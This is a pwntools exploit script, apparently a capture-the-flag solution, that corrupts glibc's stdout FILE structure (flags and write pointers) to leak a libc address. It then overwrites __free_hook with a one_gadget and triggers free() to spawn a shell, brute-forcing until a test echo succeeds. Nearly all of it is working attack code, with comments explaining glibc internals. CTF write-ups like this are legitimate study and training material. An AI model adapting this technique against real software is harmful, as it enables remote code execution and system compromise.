from pwn import *

elf = ELF('./chall')
libc = ELF('./libc-2.31.so')

_IO_USER_BUF = 1 #/* User owns buffer; don't delete it on close. */
_IO_UNBUFFERED = 2
_IO_NO_READS = 4 #/* Reading not allowed */
_IO_NO_WRITES = 8 #/* Writing not allowd */
_IO_EOF_SEEN = 0x10
_IO_ERR_SEEN = 0x20
_IO_DELETE_DONT_CLOSE = 0x40 #/* Don't call close(_fileno) on cleanup. */
_IO_LINKED = 0x80 #/* Set if linked (using _chain) to streambuf::_list_all.*/
_IO_IN_BACKUP = 0x100
_IO_LINE_BUF = 0x200
_IO_TIED_PUT_GET = 0x400 # /* Set if put and get pointer logicly tied. */
_IO_CURRENTLY_PUTTING = 0x800
_IO_IS_APPENDING = 0x1000
_IO_IS_FILEBUF = 0x2000
_IO_BAD_SEEN = 0x4000
_IO_USER_LOCK = 0x8000

while True:
	try:
		if args.GDB:
			p = gdb.debug(elf.path, '\n'.join([
				# "b *to_local_buf+78",
				"b *to_alloced_buf+67",
				# "b *to_stdout",
				# "b *to_devnull",
				"c",
				# "b *_IO_new_do_write"
			]))
		elif args.REMOTE:
			p = remote("localhost", 9090)
		else:
			p = process(elf.path) 

		WAIT_TIME = 0.8
		def local(content):
			p.sendlineafter(b'> ', b'0')
			p.sendafter(b'> ', content)
			
		def alloced(content, send_delay=False):
			if send_delay:
				time.sleep(WAIT_TIME)
				p.sendline(b'1')
				time.sleep(WAIT_TIME)
				p.send(content)
			else:
				p.sendlineafter(b'> ', b'1', timeout=1.0)
				p.sendafter(b'> ', content, timeout=1.0)

		def stdout(content):
			p.sendlineafter(b'> ', b'3')
			p.sendafter(b'> ', content)
		
		def null(content):
			p.sendlineafter(b'> ', b'2')
			p.sendafter(b'> ', content)

		def_flags = _IO_USER_BUF|_IO_IS_FILEBUF|_IO_LINKED|_IO_NO_READS
		def construct_flags(flags):
			return p64(0xfbad0000 | flags)


		# if no flag _IO_CURRENTLY_PUTTING is set then the logic below is executed 
		# 		 // _IO_new_file_overflow function
		#        if (f->_IO_read_ptr == f->_IO_buf_end)
		#            f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
		#        f->_IO_write_ptr = f->_IO_read_ptr;
		#        f->_IO_write_base = f->_IO_write_ptr;
		#        f->_IO_write_end = f->_IO_buf_end;
		#        f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;
		#
		#        f->_flags |= _IO_CURRENTLY_PUTTING;
		#        if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
		#            f->_IO_write_end = f->_IO_write_ptr;
		# 
		# so we can set _IO_write_ptr, _IO_write_base and _IO_write_end to exactly the same value
		# because we want to overwrite _IO_write_base later on and flush the buffer (that's why _IO_write_ptr has to be equal _IO_write_end)

		# struct _IO_FILE
		# {
		# 		int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
		# 		
		# 		/* The following pointers correspond to the C++ streambuf protocol. */
		# 		char *_IO_read_ptr;	/* Current read pointer */
		# 		char *_IO_read_end;	/* End of get area. */
		# 		char *_IO_read_base;	/* Start of putback+get area. */
		# 		char *_IO_write_base;	/* Start of put area. */
		# 		char *_IO_write_ptr;	/* Current put pointer. */
		# 		char *_IO_write_end;	/* End of put area. */
		# 		char *_IO_buf_base;	/* Start of reserve area. */
		# 		char *_IO_buf_end;	/* End of reserve area. */
		# 		
		# 		/* The following fields are used to support backing up and undo. */
		# 		char *_IO_save_base; /* Pointer to start of non-current get area. */
		# 		char *_IO_backup_base;  /* Pointer to first valid character of backup area */
		# 		char *_IO_save_end; /* Pointer to end of non-current get area. */
		# 		
		# 		struct _IO_marker *_markers;
		# 		
		# 		struct _IO_FILE *_chain;
		# 		
		# 		int _fileno;
		# 		int _flags2;
		# 		__off_t _old_offset; /* This used to be _offset but it's too small.  */
		# 		
		# 		/* 1+column number of pbase(); 0 is unknown. */
		# 		unsigned short _cur_column;
		# 		signed char _vtable_offset;
		# 		char _shortbuf[1];
		# 		
		# 		_IO_lock_t *_lock;
		# 		#ifdef _IO_USE_OLD_IO_FILE
		# };

		# set all the _IO_write* pointers to _IO_read_ptr
		# _IO_LINE_BUF allows us to also set _IO_write_end to _IO_write_ptr (code above) and still keep buffering
		# we are trying to set _IO_read_ptr to point before _IO_write_base, that's why the bruteforce is required
		stdout(b'A')
		alloced(construct_flags(def_flags | _IO_LINE_BUF) + b'\xb8\xb6\n')

		# before the `menu()` function call
		# pwndbg> p _IO_2_1_stdout_
		# $1 = {
		# file = {
		# 	_flags = 0xfbad2285,
		# 	_IO_read_ptr = 0x7ffff7fab6b8 <_IO_2_1_stdout_+24> "#\267\372\367\377\177",
		#   _IO_read_end = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
		#	_IO_read_base = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
		#	_IO_write_base = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
		#	_IO_write_ptr = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
		#	_IO_write_end = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
		#	_IO_buf_base = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
		#	_IO_buf_end = 0x7ffff7fab724 <_IO_2_1_stdout_+132> "",


		# after the `menu()` function
		# pwndbg> p _IO_2_1_stdout_
		# $3 = {
		# file = {
		# 	_flags = 0xfbad2a85,
		# 	_IO_read_ptr = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
		# 	_IO_read_end = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
		# 	_IO_read_base = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
		# 	_IO_write_base = 0x7ffff7fab6b8 <_IO_2_1_stdout_+24> "#\267\372\367\377\177",
		# 	_IO_write_ptr = 0x7ffff7fab6b8 <_IO_2_1_stdout_+24> "#\267\372\367\377\177",
		# 	_IO_write_end = 0x7ffff7fab6b8 <_IO_2_1_stdout_+24> "#\267\372\367\377\177",
		# 	_IO_buf_base = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
		# 	_IO_buf_end = 0x7ffff7fab724 <_IO_2_1_stdout_+132> "",

		# the pointers are ready to go
		# now program will buffer the stdout in a buffer pointed by _IO_write_base
		# to leak something we should set _IO_write_base to point at lower address than _IO_write_ptr
		# and trigger flushing by emitting newline character
		# by entering the `to_alloced_buf` function we are going to put `content?\n> ` in the io buffer effectively overwriting lower byte of _IO_write_ptr and flushing the content from _IO_write_base to _IO_write_end
		
		# pwndbg> p _IO_2_1_stdout_
		# $6 = {
		#   file = {
		#     _flags = 0xfbad2a85,
		#     _IO_read_ptr = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
		#     _IO_read_end = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
		#     _IO_read_base = 0x3f746e65746e6f63 <error: Cannot access memory at address 0x3f746e65746e6f63>,
		#     _IO_write_base = 0x7ffff7fab60a <_IO_2_1_stderr_+74> "",
		#     _IO_write_ptr = 0x7ffff7fab6c1 <_IO_2_1_stdout_+33> "\266\372\367\377\177",
		#     _IO_write_end = 0x7ffff7fab6b8 <_IO_2_1_stdout_+24> "content?\n\266\372\367\377\177",

		# we want to also restore the flags to get the normal printing behavior
		# _IO_IS_APPENDING is needed to bypass condition in `new_do_write` function
		# without it the code will fail on _IO_SYSSEEK and output will not be printed

		# static size_t
		# new_do_write(FILE *fp, const char *data, size_t to_do)
		# {
		# 	size_t count;
		# 	if (fp->_flags & _IO_IS_APPENDING)
		# 		/* On a system without a proper O_APPEND implementation,
		# 		you would need to sys_seek(0, SEEK_END) here, but is
		# 		not needed nor desirable for Unix- or Posix-like systems.
		# 		Instead, just indicate that offset (before and after) is
		# 		unpredictable. */
		# 		fp->_offset = _IO_pos_BAD;
		# 	else if (fp->_IO_read_end != fp->_IO_write_base)
		# 	{
		# 		off64_t new_pos = _IO_SYSSEEK(fp, fp->_IO_write_base - fp->_IO_read_end, 1);
		# 		if (new_pos == _IO_pos_BAD)
		# 			return 0;
		# 		fp->_offset = new_pos;
		# 	}

		# _IO_CURRENTLY_PUTTING to skip pointers setup in _IO_new_file_overflow
		# _IO_UNBUFFERED to immediately flush the buffer

		# leak + restore flags
		alloced(construct_flags(def_flags | _IO_UNBUFFERED | _IO_IS_APPENDING | _IO_CURRENTLY_PUTTING) + b'\n', True)

		leaked_bytes = p.recvuntil(b'content?', drop=True, timeout=WAIT_TIME)
		libc_addr = u64(leaked_bytes[-8:])
		print(f'[+] leaked addr {hex(libc_addr)}')

		libc.address = libc_addr - 0x1ec723
		free_hook = libc.symbols['__free_hook']
		print(f'[+] base addr {hex(libc.address)}')
		print(f'[+] free_hook {hex(free_hook)}')

		# `free()` will be called in fputs with our data, so set free_hook to one_gadget
		local(b'\x00'*0x18 + p64(free_hook)[:7])
		alloced(p64(libc.address + 0xe6c7e) + b'\n')

		# trigger free (fputs)
		null(b'd00pa\n')

		# another idea is to set free_hook to system and pass /bin/sh to fputs

		p.sendline(b'echo "TEST_STR"')

		txt = p.clean()
		if b'TEST_STR' in txt:
			print("Got the shell!")
			p.interactive()
			break
	except Exception as e:
		if len(str(e)): print(e)
		print("Killed")
		try: p.close()
		except: pass

	# run only once during the debugging
	if args.GDB:
		break

